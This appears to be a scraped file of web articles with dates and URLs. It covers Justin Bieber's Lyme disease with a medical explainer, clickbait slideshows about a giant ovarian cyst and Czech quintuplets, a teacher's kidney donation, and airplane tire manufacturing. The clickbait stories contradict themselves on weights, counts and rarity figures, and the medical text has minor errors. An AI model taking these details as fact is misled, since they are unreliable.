",29/01/2020 9:59,https://www.medpagetoday.com/popmedicine/celebritydiagnosis/84393,"Last year, many observers had speculated that pop singer Justin Bieber, 25, was battling severe depression. This week Bieber responded on Instagram to a TMZ report that he was, instead, recuperating from Lyme disease.

""While a lot of people kept saying Justin Bieber looks like sh**t, on meth etc. they failed to realize I've been recently diagnosed with Lyme disease, not only that but had a serious case of chronic mono which affected my skin, brain function, energy, and overall health. These things will be explained further in a docuseries I'm putting on YouTube shortly. you can learn all that I've been battling and OVERCOMING!! It's been a rough couple years but getting the right treatment that will help treat this so far incurable disease and I will be back and better than ever""

The 10-part docuseries, Justin Bieber: Seasons, which will air in late January, reportedly shows Bieber and his family discussing the multiple symptoms the Canadian singer had been experiencing during 2019. Before finally being diagnosed late in the year, he received a variety of treatments which only made the symptoms worse.

Bieber's wife of four months, Hailey Baldwin Bieber, supported him in a tweet: ""For those who are trying to downplay the severity of Lyme disease. Please do your research and listen to the stories of people who have suffered with it for years. Making fun of and belittling a disease you don't understand is never the way, all it takes is educating yourself.""

What is Lyme Disease?

Lyme disease is the most common vector-borne disease in the U.S. Lyme disease is caused by the bacterium Borrelia burgdorferi and rarely, Borrelia mayonii. It is transmitted to humans through the bite of infected blacklegged ticks. The blacklegged tick (or deer tick, Ixodes scapularis) spreads the disease in the northeastern, mid-Atlantic, and north-central U.S. The western blacklegged tick (Ixodes pacificus) spreads the disease on the Pacific Coast.

Lyme Disease causes more than 300,00 illnesses each year in the U.S. According to the Centers for Disease Control (CDC), the number of cases of Lyme disease reported to the CDC has increased steadily over the past 25 years. In addition, the disease appears to be expanding geographically: The number of counties with an incidence of ≥10 confirmed cases per 100,000 persons increased from 324 in 2008 to 415 in 2018.

What are the Symptoms of Lyme Disease?

The symptoms of Lyme disease can be divided into four stages:

1. Early localized stage (3-30 days post-tick bite)

Bulls-eye rash illustration

Red, expanding rash called erythema migrans (EM)

Fatigue, chills, fever, headache, muscle and joint aches, and swollen lymph nodes

Not all people get the erythema migrans rash. General symptoms may be the only evidence of infection. Some people get a small bump or redness at the site of a tick bite that goes away in 1-2 days, like a mosquito bite.

More about Erythema Migrans:

Rash occurs in approximately 70-80% of infected persons and begins at the site of a tick bite after a delay of 3-30 days (average is about 7 days)

Rash gradually expands over a period of several days and can reach up to 12 inches (30 cm) across. Parts of the rash may clear as it enlarges, resulting in a ""bull's-eye"" appearance

Rash usually feels warm to the touch but is rarely itchy or painful

EM lesions may appear on any area of the body

2. Early disseminated stage (days to weeks post-tick bite)

Bell's palsy

Untreated, the infection may spread from the site of the bite to other parts of the body, producing an array of specific symptoms that may come and go, including:

Facial or Bell's palsy (muscle weakness on one or both sides of the face

Severe headaches and neck stiffness due to meningitis (inflammation of the spinal cord)

Pain and swelling in the large joints (such as knees)

Shooting pains that may interfere with sleep

Heart palpitations and dizziness due to changes in heartbeat

Many of these symptoms will resolve over a period of weeks to months, even without treatment. However, lack of treatment can result in additional complications, described below.

3. Late disseminated stage (months-to-years post-tick bite)

Approximately 60% of patients with untreated infection may begin to have intermittent bouts of arthritis, with severe joint pain and swelling. Large joints are most often affected, particularly the knees.

Up to 5% of untreated patients may develop chronic neurological complaints months to years after infection. These include shooting pains, numbness or tingling in the hands or feet, and problems with short-term memory.

4. Lingering symptoms after treatment (post-treatment Lyme disease syndrome)

Approximately 10-20% of patients with Lyme disease have symptoms that last months to years after treatment with antibiotics. These symptoms can include muscle and joint pains, cognitive defects, sleep disturbance, or fatigue. The cause of these symptoms is not known, but there is no evidence that these symptoms are due to ongoing infection with B. burgdorferi. This condition is referred to as Post-treatment Lyme disease syndrome (PTLDS). There is some evidence that PTLDS is caused by an autoimmune response, in which a person's immune system continues to respond, doing damage to the body's tissues, even after the infection has been cleared. Studies have shown that continuing antibiotic therapy is not helpful and can be harmful for persons with PTLDS.

How is Lyme Disease Diagnosed?

Lyme disease can be difficult to diagnose for several reasons. Many of the common symptoms associated with the disease, such as headaches, dizziness, and joint/body pain, also occur with other diseases. The most distinct symptom of Lyme disease, erythema migrans (EM), does not appear in at least one quarter of people who are infected with Lyme bacteria. Also, current diagnostic tests do not always detect early Lyme disease since antibodies take time to rise to detectable levels. In addition, antibodies normally persist in the blood for months or even years after the infection is gone; therefore, the test cannot be used to determine cure. Lastly, infection with other diseases, including some tickborne diseases, or some viral, bacterial, or autoimmune diseases, can result in false positive test results.

The Centers for Disease Control and Prevention (CDC) currently recommends a two-tiered testing approach: a conventional enzyme-linked immunoassay (ELISA) test, followed by a Western Blot test. The ELISA is a blood test that detects antibodies but does not test for B. burgdorferi itself. A positive result from this first-level screening may suggest current or past infection. The ELISA is designed to be very ""sensitive,"" meaning that almost everyone who has Lyme disease (and some people who do not) will test positive. If the screening test is negative, it is highly unlikely that the person has Lyme disease and no further testing is recommended. If the screening test is positive or inconclusive, a Western blot test should be performed to confirm the results.

Because treatment is generally more effective in early stages of the disease, it is important to develop new tools that can help doctors make an early diagnosis. On July 29, 2019, the Food and Drug Administration (FDA) cleared several Lyme disease serologic assays with new indications for use, allowing for an enzyme immunoassay (EIA) rather than western immunoblot assay as the second test in a Lyme disease testing algorithm.

How is Lyme Disease Treated?

According to the National Institute of Allergy and Infectious Disease, for early Lyme disease, a short course of oral antibiotics, such as doxycycline or amoxicillin, cures the majority of cases. In more complicated cases, Lyme disease can usually be successfully treated with three to four weeks of antibiotic therapy.

After being treated for Lyme disease, a minority of patients may still report non-specific symptoms, including persistent pain, joint and muscle aches, fatigue, impaired cognitive function, or unexplained numbness. These patients often show no evidence of active infection and may be diagnosed with post-treatment Lyme disease syndrome (PTLDS).

Her Pregnancy Revealed Something Out Of The Ordinary
",24/01/2020 16:10,https://www.housediver.com/worldwide/weird-preg,"Meet Katie Smith, your average mid-twenty-year-old girl. Well, if you consider this situation average. When Ms. Smith was just 24 years old something starting unbelievable began growing inside of her and doctors couldn’t figure out what it was.

The Beginning

Katie’s stomach expanded so large and so fast that she seemed pregnant! The weird part, she wasn’t pregnant at all. Every pregnancy test that she took said negative but her doctors continued to dismiss her overwhelming concerns.



Her Story

Smith is 28 years old and from Swansea in Wales. Back in 2014, she began gaining weight, and within just a few years she resembled someone nine months pregnant. She told BBC that she never was super skinny, but gradually she developed a belly like this

Healthy Lifestyle

Katie lived a healthy life and was very conscious of keeping her figure. She loved her curves and spent a lot of time at the gym. This is why her progressive weight gain was so infuriating. Unfortunately, the mystery was left unsolved.

Not As It Seems

At this time Katie thought her biggest problem was whether she would be able to go to work Christmas party because she felt insecure in her outfit. At this time, Katie felt she was not thin enough.



Too Fast To Keep Up With

Katie tried everything but her stomach wouldn’t stop growing. As she said ” “I was exercising and eating healthily but I was slowly getting bigger. There’s nothing worse than keeping a healthy lifestyle but still gaining an excessive amount of weight.

What Was Going On?

It crept up so slowly [that] I didn’t know anything was wrong – I thought I was putting on timber.” Regardless of how much she worked out or maintained a strict diet, she was still gaining an enormous amount of weight.



Not Just Growing

At this point, she couldn’t ignore her excessive weight gain. She began to notice that all the weight she was gaining was going directly to her stomach, and it felt different too. How would she proceed?

Staying Hopeful

Her stomach started to feel hard and uncomfortable to touch. However, she stayed positive and was hopeful that this would go away with time…. but some things don’t always work out the way we want.



There’s Only One Explanation

Her dress size was increasing at rapid speed and she was now a size eight. But still, she was too afraid to see a doctor. She grew up with her father as a doctor and this made her a bit apprehensive.

Her Gut Feeling

Little did she know that bigger concerns were approaching. At this point, Katie could only think of one explanation. She wasn’t sure she wanted to believe it, however. What was she thinking it was?



With Child

When considering all the components Katie decided there was only one possible reasoning for this, and that was pregnancy. Her belly was growing and she was gaining weight, she was always exhausted, and had a serious boyfriend.

Unplanned Pregnancy

When looking at all the factors, all things pointed to a bun in the oven! This possibility made Katie and her boyfriend nervous. If she was pregnant, then it was surely unplanned. However, given her situation, this was a possibility.



Soon To Be Parents

Katie and her boyfriend Jamie Gibbons had been together for 10 years already and they did consider the possibility that she was pregnant. Although they weren’t ready for it, they knew they had to at least check.



The Blue Stripe

When the couple saw that the pregnancy test was negative, they were both surprised. They figured the test was incorrect, so she immediately took a second one. But it only showed the same result once again!

Getting Really Worried

They were surprised and decided it was time to see a doctor. What exactly was going on here? Was she sick? Did she have a miscarriage? A million dreaded things were popping into her head and really scaring her.



Facing Her Fears

Katie had no options left and it was time to finally see a doctor. Unfortunately, she did not receive the answer she was expecting or hoping for. The doctor simply told her that she was “merely fat.” At this point, she saw no way out.

Following Her Instincts

Although the doctors dismissed her worries, Katie felt something was wrong. She ignored it though because it didn’t impact her daily routine. Still, she couldn’t understand what was going on.

Not Trustworthy

She couldn’t stop wondering why she wasn’t pregnant. It seemed she was pregnant, so what was the deal? She didn’t fully trust the doctors and their thoughts. But, they were professionals so she should trust them, right?



No Solution

If she were pregnant, at least the problem would disappear once she gave birth. Unfortunately, her stomach continued growing for a full two years. Every month it just kept getting larger and larger until something awful happened at work.

She Didn’t Feel Well

It was just a normal day on the job when all of a sudden Katie felt light-headed and nauseous. That’s when she collapsed. She was told by her coworkers that she had fainted.



A Difficult Period

After this, Katie realized she needed to see a doctor right away. She said “It was a tough period in work and when I passed out my GP put it down to stress.” She had no other explanation and just had to continue her life like she was living it before.

All From Stress?

Is it possible to pass out simply from being too stressed out? Katie wasn’t too convinced. But her doctor tried to reassure her that nothing major was going on, and that she definitely wasn’t pregnant.



Not What It Appears

It was impossible to avoid unwanted questions regarding her “pregnancy.” People noticed her growing belly and there was no trying to ignore it. She had to explain herself repeatedly.

No End In Sight

Katie always answered with the same response day in and day out, ” The doctors say I am just overweight.” Although she was annoyed with the situation, she also saw no end approaching.



Due Date

She said people were always asking her when the baby was due, and after a while, she began to lie to spare them the embarrassment. So instead she just told them she is overweight, because this is what she believed.



Changing Appearance

Katie was waddling around with a giant belly and she started to feel embarrassed about her appearance. She even started to shop in the maternity section because nothing fit her.

Maternity Clothes

“I remember trying to shop for clothes in December 2016 and nothing would fit. I was skin and bone on top, then this massive lump and normal legs. The only thing that was going to fit was maternity wear.”



Needs Help

Katie was stubborn about getting help. Only after several blackouts at work, difficulties breathing, and excessive weight gain that interfered with her life, did she seek assistance.



Seeking Assistance

And this still wouldn’t have happened if it weren’t for her coworkers who insisted she get checked out. Many people wonder why Katie didn’t take care of herself more. Something was clearly off, so why was it taking her so long to seek help?



A New Explanation

Katie was going about her life trying to avoid her situation. But enough was enough when she passed out four times! This time the doctor reasoned her exhaustion by blaming her acne medication but she refused to accept this response.

Time To Stand Up

It seemed like the doctors weren’t taking her symptoms or situation seriously. They continued to blame other causes and things going on in Katie’s life. She decided it was finally time to put her foot down.

Enough Was Enough

She had stopped taking it for several months before and insisted there had to be another explanation. She consulted a second doctor who also said she had to be pregnant. He did numerous blood tests that all came back with no results.

Getting To The Bottom Of It

Her GP concluded that the only explanation was pregnancy, regardless of the blood test results and no further examination. So, he ordered a second ultrasound. At this point even walking was a difficult task for Katie and she was having difficulty breathing.

The Truth At Last

The doctor who saw her requested that they immediately check if she was pregnant. Was she finally going to get to the bottom of this? Well, it certainly opened an entirely new can of worms that she was not expecting.

Terrified

Katie watched the doctor as she did the ultrasound. When she saw her expression it was clear something was wrong. Her eyes were enlarged and she had a look of fear come over her.

Consoling Katie

The doctor requested a consultant and Katie became paralyzed. Her boyfriend Jamie tried to console her but there was no stopping the panic she felt at that moment. What was really going on inside of her stomach?



Not Pregnant

The ultrasound screen was blank, and it was clear that Katie was not pregnant. However, there was something still going on inside her stomach. All they knew for sure was that her life was in danger.

Surprising News

The possibilities were endless, regardless they needed a CT to find out. Katie was understandably scared and extremely worried for what was to come. Her mind went to a number of possibilities.



Emergency CT

The blank ultrasound led to an immediate request for a CT scan that revealed astonishing news. The doctors prepared Katie for what they were about to tell her. Katie and her boyfriend sat hand in hand waiting for the big news.

Definitely Not Pregnant

Katie definitely wasn’t pregnant. The reason for her large belly was actually the result of a huge ovarian mass. At this point, Katie’s whole world came crashing down, as the doctor could not confirm exactly what he was dealing with.



To The Skin

It wasn’t your average cyst and was 24 centimeters thick and attached to her stomach. This finally explained her gaining weight, but her life remained in danger. Measures had to be taken immediately.

What Exactly Is An Ovarian Cyst?

Essentially a cyst is a fluid-filled sac that can develop on a woman’s ovary. They are extremely common and usually don’t cause harm, and most often disappear on their own. But, not for Katie.

Oddly Large

The only situations where a cyst can interfere with a person’s life is when it ruptures, blocks the blood supply to the ovaries, or in this case, is very large. Katie’s was really large, no…extremely large!



Exploring Her Options

One month later, Katie was speaking to a specialist who went over the options available for her. The image of the consultant’s face is still ingrained in her brain. He was in utter shock at her belly.

Complete Shock

Although he calmly explained to her that she had a large ovarian mass, his face revealed the truth. He was completely shocked. No one could have expected the size of the cyst, even the specialist.



That’s Not All

The doctor said it was possible that there were multiple cysts, and that they could be attached to organs. Katie couldn’t believe it, and yet, she knew that at this point the only option was surgery.

The Effects

Although they had ruled out the other explanations, they still were unclear the effect the cyst had on her body. She definitely had side effects, and of course, they had nothing to do with being pregnant.



You’re Fine

Although the doctor was unsure of what/how big the cyst was, he decided that there was something that had to be done. He couldn’t believe all of Katie’s other doctors had turned her away with a “you’re fine” response.



One Thing For Certain

One thing her doctor was certain of was that she would lose one ovary. In addition, depending on the location of the cyst, she may be hospitalized for longer. Katie felt like she was signing her life away.



Support

Katie’s mother lives in Australia so she decided not to tell her about this whole situation, not to worry her. But since the mystery was finally solved, she felt it was time to let the family know.

All Alone

At this point, it was too much for her to go through this alone so she called her mom and her sisters to be by her side. Katie had battled alone for the majority of this medical situation, but she felt it was enough.



Ready To Go

Within two days her mother arrived, but unfortunately, her dad had to stay back in Australia. Even with the time difference, he was always just a phone call away. She had all the support she needed and was ready for the dreadful day.



Going Under

The doctor informed Katie that in 4 weeks’ time she would be set for surgery. The time finally arrived and Katie was ready for surgery. In the short time between her initial consultation and surgery, her stomach grew another five inches.

Emergency Surgery

The high-risk obstetrics consultant she was referred to said surgery was a must and that he was going to cut her open from her chest bone down to her pelvic bone, like an old fashion C-section. Those were some comforting words!

March 9th, 2017

The day finally came in a blink of an eye. Katie was handed a surgery gown and a pair of socks. She put them on and was taken by the nurse. Her body was paralyzed knowing that at any minute a giant needle would be stabbed into her body.



Extra Help

Katie was so uneasy and difficult that she needed to be held down by two nurses. She wouldn’t stop moving and they needed to put the needle inside her. She says she really felt like she was dying.



And The Wait Continues

The doctors expected the surgery would only take an hour or so. But it took five! Her family patiently awaited the end, fearing for Katie’s life. However, the doctors managed to remove the cyst.

Back To Normal

The cyst was enormous, but the weight blew everyone away. Finally, this ginormous thing was removed from Katie’s body. She couldn’t wait to be back to her normal self again!



Minutes To Hours

She was extremely terrified but knew this was the way to get back to her old life. The surgery was supposed to last 90 minutes, but hours passed by before she was finished. Her friends and family waited in angst.



How Big?

The cyst came out to 60 pounds! If you struggle with understanding how much 60 pounds is, then it’s equivalent to seven babies! Katie woke from surgery surrounded by the hospital staff showing her pictures of what was inside her for so many months.

Treated Like A Celebrity

Katie was overwhelmed and confused when she woke up from surgery. “I remember still being groggy from the anesthetic as they wheeled me back to the ward and excited hospital staff was shoving photos in front of me,” said Katie.

After Surgery

The cyst accounted for one-third of Katie’s body weight and she began to realize the impact it had on her life. She couldn’t do the things that were once so normal for her. It was a real burden on her life.

Losing The Cyst

Once she was lacking this excess weight she noticed that it was making easy tasks in her life seem difficult, like driving a car or walking upstairs. Losing this cyst essentially brought her back to life.



Nickname

She was in utter disbelief that she was carrying so much weight around! After seeing the photos she said that “It looked like a massive pile of ice cream so I called it Mr. Whippy!”

Medical Mystery

The doctors were blown away by the size of Katie’s cyst. She was a true medical phenomenon! She along with the entire medical staff could not believe what was living inside her for so long.

Back Home

Katie was released four days later and had the support of her mother and boyfriend. Although she was dreading this process, the after effect made it all worthwhile. Smith doesn’t even remember life without an extra 60 kg!

Her Reminder

Katie has a 30- centimeter scar that extends from her sternum to her pelvis from the surgery. Not long after the procedure, she was already able to walk around easily. She couldn’t wait to start her new life with all the changes it brought. One drawback of the surgery was that Katie lost her right ovary, but the doctors informed her that this wouldn’t affect her having children.

Body Changes

Aside from her scar, Katie’s stomach is also covered in stretch marks, which are daily reminders of this experience. Regardless, Katie prefers the stretch marks to a 60-pound lump growing in her stomach.

A New Katie

Katie’s family came to visit her soon after the surgery and they were shocked to see her new appearance. She was so thin, basically half the woman she was before the surgery! Katie was so happy to be back to herself.

Smooth Sailing

Katie recollects on her recover and says it has been more or less smooth sailing, with some hiccups along the way. She says that her health is definitely much better than last year, both physically and mentally.

Saying Thanks

She has singled out her family, friends, and coworkers to say thank you for all their help during her recovery. Katie says she doesn’t think she could have done this without them and tells herself how lucky she is every day for her support network.



Inspirational

A year ago, Katie would never have shared her story. However, since then she has only grown more comfortable in her body. She is now sharing her story and is a true inspiration to us all!



There’s Hope

Despite going through this difficult experience and the reminder from her scar and stretch marks, Smith finally has her life back and has been reassured she will still be able to have children without her right ovary. She is so thankful for her surgeon.

Alexandra & Antonin

Alexandra Kinova and her husband Antonin Kroscen had plans to create a family and they were unprepared for what was about to happen. They figured they had some time before starting their family together, but then they discovered that she was pregnant with twins. Unfortunately, one doctor’s visit revealed something unexpected…

Happy To Be Expecting

Alexandra and her partner Antonin, a couple from the Czech republic were very excited when they heard that they were expecting a child. This is normal for any couple, but they were unprepared for what was coming for them.

Ready For Parenthood

Although she was only 23, she wasn’t afraid of the future. Since she was already the mother of her child, she knew what to expect going forward. Little did she know that she was completely unprepared for what life had in store.

She Thought It Was Under Control

She figured her second pregnancy would be easy since she had already done it once before. Unfortunately, after visiting the doctor, she realized that this couldn’t be further from the truth. But what did they tell her?

More Than She Thought

While she was ready to have one child, she soon learned that she was having twins. It wasn’t that having twins was such an unusual concept, but this birth alone was about to be legendary and nobody knew at the time.

Completely Unaware

The possibilities were endless. Was she pregnant with an alien? Was Antonin not the father? The truth could be anything, but at least the ultrasound would help her understand in some way what was going on.

A Follow-Up

The first ultrasound was just like any other and Kinova simply saw that she was pregnant. The doctors were pleased that she was healthy and had no impression that something unsettling would be found in the second one.

Even The Doctors Didn’t Know

Kinova visited the doctor once more and this time she learned some new information and within several weeks they found a heartbeat. But not just one.. this was not what they were planning for.

Double The Fun

After Kinova had her ultrasound she learned she had twins in her belly. The couple was in complete shock. They were already parents of 1 and now they were about to be the parents of three. They had no clue what was coming.

The Preparations

They spent the upcoming months planning and preparing for their twins. They purchased baby clothes and furniture to keep their babies comfortable. While they thought they were doing everything right, they were completely unaware of what was to come.

Unaware Of The Truth

In between her check-ups, everything seemed to be going as planned and Kinova did not expect anything out of the ordinary. While she was having twins, this still wasn’t unheard of to happen to a mother.

Something’s Not Right

She was getting deeper into her pregnancy and she could sense that something wasn’t completely right. She waited anxiously for her next appointment and told herself that she would be okay in the meantime.

Finally The Truth

When it came time for her next doctor’s appointment, they looked at her records and also at Kimova and were a bit confused. There was something about her that seemed slightly off. They decided to order a second ultrasound to get to the bottom of it.

Her Husband Was Completely Lost

Her partner was with her through everything and was present at all doctor’s appointments. He certainly could have never predicted what to find in the ultrasound nor for his new responsibilities.

Staying Positive

Kinova’s doctor and husband were becoming more concerned about her, despite this, she always remained calm and collective. She had been taking good care of herself ever since she found out she was pregnant and never missed a chance to take her vitamins. While she did not doubt that her babies would be healthy, her doctor made her think the opposite.

The Doctor’s Would Say Differently

Kinova was brought to the hospital for her doctor’s visit and she listened as doctors spoke in quite tons about her pregnancy. She didn’t understand the secrecy and the fact that they didn’t notice she was standing right there.

Concerned For Her Newborns

Her doctors’ faces said it all and gave her cause for panic. She was trying her best to stay positive but the moment she stepped into the doctor’s office that all chance. After her check-up that day she would understand why her doctor was becoming concerned about her.

The Opposite Of What They Thought

Going for an ultrasound was normal for an expecting mother but the reason the doctors were so concerned was because of how much her stomach had grown in such a short time. Finally, the doctors broke the news and the couple could not believe their ears.

Expecting The Worst

The doctors broke the news that she was not carrying twins so she immediately assumed that one of the babies passed away. It happens sometimes where one twin eats the other but, that was not what happened in her situation.

Looking For The Answers

Now she knew she wasn’t expecting twins, but what was it that she was expecting? She was starting to think that she wasn’t pregnant and maybe she just had a strange tumor that couldn’t stop growing. What they found hadn’t been seen in over 500 years.

Fearing For Her Future

Kinova wasn’t sure what exactly was going on and she was getting more concerned about her health. She was following everything exactly how she was supposed to and was eating correctly. She was so upset to think that she may lose her babies.

The Doctors Couldn’t Believe It

By taking one look the doctors could tell that Kinova’s pregnancy wasn’t the norm for a woman expecting twins. Her stomach was increasing at an unusual speed that wasn’t even normal for a woman expecting triplets. The ultrasound offered some help but they still didn’t have all the answers they were hoping for.

Just More Questions

It was hard to tell what exactly was going from the ultrasound. It was clear she was not just expecting twins, but they were still not entirely just how many children she was going to have. Wow, that must have been unsettling for Kinova.

Not Twins

The doctors broke the news that she wasn’t having twins and her heart sank to her stomach. This is the worst news to hear when your expecting twins, it makes a mother feel like they are no longer carrying a child. However, the truth was completely the opposite.

No Official Number

The doctors informed her that she wasn’t having twins or triplets. This seemed confusing, especially since she had not gone through any type of fertility treatment and so she wasn’t likely of having multiple births. It seemed that anything was possible at this point.

The Party Is Coming

The doctors confirmed amongst themselves and then confirmed with Kinova that she was having quadruplets. She was baffled by this, especially since she was already surprised to hear she was having twins! Now they were about to have a full house with 5 children! Finally, the surprises were over… or that’s what they thought.

More To Come

The couple rushed back to the store to buy more items for their new babies. Now they had everything they needed for four babies. However, when they went in for another checkup, the ultrasound revealed something entirely.

Another One Joins The Party

Alexandra and her husband Antonin were getting used to the idea of having four babies when they saw something in the ultrasound. Now they weren’t just having two babies or four, but instead, they were having five!

One Was Hiding

The doctors did not see the fifth baby right away because of all the fetuses in Kinova’s belly. They were all moving around and it was difficult to get a clear picture. Suddenly they noticed something else in the scan… Was it possible that there was a sixth baby?

Gender Reveal

Although she wasn’t expecting sixth babies, now that she was ready for it she still wanted to know if they would be boys or girls. She needed to know what she should be prepared in terms of outfits and colors, but the doctors could not give her those answers just yet.

The Big Day

Kinova was going to have to wait for the day to find out the genders of her babies. Kinova went into labor and 40 people were waiting in the waiting room for her and the quintuplets. It was clear that a lot could go wrong with so many babies involved but maybe her life was being threatened as well.

Calling For Help

The hospital staff and doctors on call were not used to so many births at once and they needed all the hands they could have. They even asked a cameraman to come in to capture the experience on film. There was barely room for Kinova’s own family or husband!

All Hands On Deck

As soon as they popped out, each baby was looked after by two nurses. They had to check their vitals and make sure everything was running smoothly since there were so many births at once. All nurses were called in to monitor the babies.

Safety Comes First

Given her situation, Kinova was forced to have a C-section. She was told that this would be the most responsible and secure method to make the babies were delivered in the safest way possible, without any problems.

The Little One

All of the babies required attention, but the littlest one needed a bit of extra support. Kinova and her babies spent several days in the hospital until they were taken home and ready to start a new life together.

A Family Of Five

All of the births went smoothly and they now had a big happy family of five. The real question was now how many boys and how many girls the couple ended up having! Truthfully, as long as they all came out safely is really what we care about.

Mommies Move-In

Their house was about to get a bit fuller with 5 babies in addition to Kinova’s mother and her husband’s mother. They came to help the parents bring the babies home from the hospital but also moved into their home to offer further assistance. That’s not all they did, but they also asked the government for assistance since the babies soon became national news.

Record-Breaking News

Alexandra and Antonin were so happy with their family of eight had four boys, who were named Daniel, Alex, and Martin. The fifth was the only girl named Terezka. Turns out she even broke a record.

Special Babies

Alena Makarova was an obstetrician in the room and she did some research after the birth and discovered that this birth story was part of history. It was obvious that giving birth to 5 babies was a big deal, yet it wasn’t clear what it was that made them so special.

Rare Kind

The obstetrician was interviewed by the Telegraph and she explained that there had never been a mention of quintuplets, and she had all the records since 1949. Essentially, Kinova was the first mother to give birth to five children in the whole area.

Quadruplets Are Just As Rare

In the Czech Republic, it has been found that quintuplets are born only once every 480 years. The chances of giving birth to quadruplets here are one in seven million. They decided to look at these statistics around the world.

Vitro Fertilization

Giving birth to quintuplets is usually rare and is due to fertility treatment like In Virto Fertilization. However, Kinova conceived these babies naturally and the answer is probably found in her genes.

Family Connection

Kinova and Kroscen both explained that twins are common in their families. Since they run in both of their families, it is not completely surprising that they gave birth to quintuplets. Wow, five babies, that most be tiring!

Several Connections

Their family was receiving many donations and helping hands for their large family. Aside from financial support, they also had their family and friends who were willing to lend a hand wherever they could.

Financial Support

As soon as people started to hear about the quints’ birth, people from around the world wanted to help any way that they could, including with donations. This type of news is pretty rare and everyone was interested in helping raise money any way that they could.

Help From The Government

Unfortunately, the family couldn’t access outside donations because the government agreed to prove the family with assistance. They sent them a nanny, but over time they would see that this was not sufficient with 6 children.

Access Denied

The system had never experienced a situation like Kinova and her family before so they denied providing extra government assistance. The Czech Social Affairs Ministry announced a statement saying “Simply put, our system is not prepared for such multiple instances of ‘good luck.’”

Strong Family

Although the family has gone through many obstacles they are still extremely happy to be raising their children and are excited to celebrate each birthday and celebration that their family of five shares together.

Too Much For Her

While it was certainly difficult taking care of five babies, Kinova and her husband have shown that you achieve anything as long as you put your mind to it. Given the condition, they were born in to, these babies have a 95% chance of growing up healthy and every day live the risk.

Milestones

Five years later and Kinova is still as energetic and loving as she was when the quintuplets were born. She is also motivated because her situation is extremely uncommon. The likelihood of conceiving quintuplets is one in 48 million pregnancies. There around 800 quintuplets around the world and 130 were conceived randomly.

Big Happy Family

Time has passed since Alexandra learned that she was going to give birth to quintuplets and she didn’t ever foresee a life with so much love and happiness. All she knows for sure is that she has no plans having more children, despite her immense love for her children.",Her Pregnancy Revealed Something Out Of The Ordinary,

Nancy Bleur is a lovely and caring 54-year-old kindergarten teacher from Iowa. She absolutely adores her students and goes out of her way to make them happy.

One day she noticed that 4-year-old Camden in her class wasn’t his usual self. She decided to have a little chat with him to see what was up. That’s when the boy started telling her about his father… and it made her heart sink. She felt like she had to do something – and fast.

Turns out Camden’s father, 34-year-old Darreld Petersen, was very sick. When Nancy realised just how bad, it made her even more worried as she couldn’t bare the thought of how it was affecting little Camden. That’s when she decided to call the dad up.

There was something seriously wrong with Darreld’s kidneys that made them function at just 20 percent of their capacity. During his dialysis treatment, he looked so sick that poor Camden was terrified when he saw his daddy.

Nancy decided she wanted to help the family in any way she could. You might think she offered to babysit, help with the groceries, cook or any other daily chore – but Nancy went much further than that in lending her hand.

She offered Darreld one of her kidneys.

Miraculously, she happened to be a perfect match, meaning all she had to do was to quickly fill in some paper work.

“I was really excited about it. I was ecstatic. I don’t know what I would’ve done for closure if I wasn’t [a match],” she says.

Camden’s dad was shocked and delighted with Nancy’s extraordinary offer. She would be saving his life.

“It’s just amazing. There are people waiting every day for a kidney, for an organ in general. I wish there were more people like her. She’s giving me a second chance at life,” Darreld told ABC News.

When the family found out that Nancy’s kidney was a match with Darreld’s, they decided to surprise her with flowers at school. Camden couldn’t be happier about the fact that his teacher is helping save his father’s life.

The world is full of good people! If everyone were as selfless as Nancy, the world would be a better place. Now let’s hope that the operation runs smoothly and that they both have a speedy recovery

Why plane tires don't explode during landing

Plane tires can handle thousands of pounds of weight and high speeds — and it's mostly due to how they're made.

A combination of sturdy materials and nitrogen create a tire strong enough to handle the rigorous conditions upon landing.

Goodyear, one of the leading manufacturers of plane tires, gave us a look inside its factory to see how it ensures tires are up to its standards.

Visit Business Insider's homepage for more stories.

Following is a transcript of the video.

Narrator: If you dropped a watermelon at 170 mph, it would be a mess. Strap over 500,000 pounds to its back and it would be, well, nothing.

But airplane tires manage that impact every day, without incident. They're made to withstand hitting the pavement at extreme speeds, all while supporting an entire commercial jet. Don't think too hard about it next time you're in the air, but 45 inches of rubber is the only thing standing between you and the tarmac during landing.

So, what makes them tough enough for the job?

If you've ever driven down a US highway, you've probably seen shredded tires along the way. Semitruck tires aren't supposed to explode, but they do. Airplane tires? Not so much. There are a few differences between the two.

First of all, a semitruck isn't falling out of the sky as part of its route. Those tires don't need to be made to withstand the same high speeds and weights. Airplane tires, on the other hand, need to be reinforced.

Brandy Moorhead: They're made with a combination of proprietary synthetic rubber compounds, which are paired with aluminum steel reinforcements and nylon and aramid fabrics.

Narrator: That's Brandy. She's in charge of Goodyear's aircraft tires, and she told us that airplane tires are inflated twice as much as truck tires and six times as much as a car's. That's because the higher the pressure, the firmer the tire, and the more strength it has to support the plane. And when they're inflated, it's not with regular air. Airplane tires are filled with nitrogen.

Brandy: Nitrogen is an inert gas, so high temperatures and pressure changes have less effect.

Narrator: Plane tires are subjected to the most rigorous conditions of any vehicle tire. When Goodyear develops a new airplane tire, it starts with a prototype. Then the tires are tested beyond their breaking points. They're tested for speed, pressure, and the ability to handle a load up to 38 tons. So they have to be made very differently than other tires. Instead of the blocky design seen on a lot of car tires, plane tires get groovy.

Brandy: That blocked pattern enables different maneuvering and different characteristics of ride and handling, which are required by an automobile, as opposed to just an aircraft that takes off and lands on a runway. The reason we have grooves in an aircraft tire at all is because we need to evacuate water if we were to land on a wet surface.

Narrator: Commercial jets usually have around 20 tires and touch down about 500 times before they have to be retread, which can be done seven times before the tire's no better than scrap rubber. And tires at the nose of the plane tend to have shorter life spans than the rest.

It takes two mechanics up to an hour to change a single tire. They raise the tire only 5 centimeters off the ground, which doesn't feel like enough room to fit a thumb, let alone change a plane tire. The mechanics take off the hubcap and reduce the tire pressure from 200 to 30 psi, which reduces the risk of it exploding as the bolts and nuts holding it on the plane are removed. A sleeve protects the axle, and a lifting tool pulls the tire off. The axle sleeve is then greased, and the new tire is slid smoothly on. And then things move in reverse: nuts and bolts, tire reinflated to 200, hubcap back on, and the whole thing is gently lowered 5 centimeters back onto the ground.

So, what happens after 500 landings, seven retreadings, and uncountable ""This is your captain speaking""s? A lot of the tires get recycled into playground mulch and even other tires for farming equipment. Those tires will be made from old plane tires, but not like them. There's no need. Because if a farmer is using their tractor the same way they'd use a plane, well, they're doing it wrong.

Let’s for a moment ignore the extreme conditions (gravity, atmospheric pressure, high temperature, and winds) that are found on the giant planet, and let’s just descend through the atmosphere. What we’d see is a spectacle like no other.

